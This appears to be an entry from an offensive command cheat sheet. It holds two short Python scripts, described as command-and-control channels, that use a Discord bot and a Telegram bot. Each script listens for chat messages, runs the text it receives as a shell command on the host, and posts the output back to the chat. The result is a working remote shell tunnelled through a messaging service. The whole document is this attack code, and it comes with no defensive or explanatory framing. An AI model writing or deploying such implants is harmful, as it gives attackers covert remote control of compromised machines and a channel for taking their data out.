commands.description: Use Discord bot as C2 — receive commands, send output
commands.command:
import discord, subprocess
client = discord.Client(intents=discord.Intents.all())
@client.event
async def on_message(msg):
    if msg.author == client.user: return
    if msg.content.startswith('!cmd '):
        out = subprocess.check_output(msg.content[5:], shell=True)
        await msg.channel.send(f'```{out.decode()}```')
client.run('BOT_TOKEN')

commands.description: Telegram bot C2 — receive commands, send output
commands.command:
import telebot, subprocess
bot = telebot.TeleBot('BOT_TOKEN')
@bot.message_handler(commands=['cmd'])
def run_cmd(msg):
    cmd = msg.text.replace('/cmd ', '')
    out = subprocess.check_output(cmd, shell=True)
    bot.reply_to(msg, out.decode())
bot.polling()
